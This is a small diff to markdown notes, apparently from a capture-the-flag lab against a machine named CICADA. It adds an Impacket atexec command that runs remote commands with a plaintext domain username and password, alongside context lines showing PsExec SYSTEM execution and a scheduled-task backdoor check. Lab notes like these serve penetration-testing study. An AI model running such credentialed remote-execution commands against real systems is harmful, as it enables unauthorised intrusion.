@@ -55,3 +55,9 @@ c:\tools\pstools\PsExec64.exe -s -i regedit
 schtasks /query /tn TaskBackdoors
 ERROR: The system cannot find the file specified.
 ```
+
+### atexec Scheduled Task Execution
+
+```
+python3 atexec.py CICADA/emily.oscars:'Q!3@Lp#M6b*7t*Vt'@10.10.11.35 dir
+```
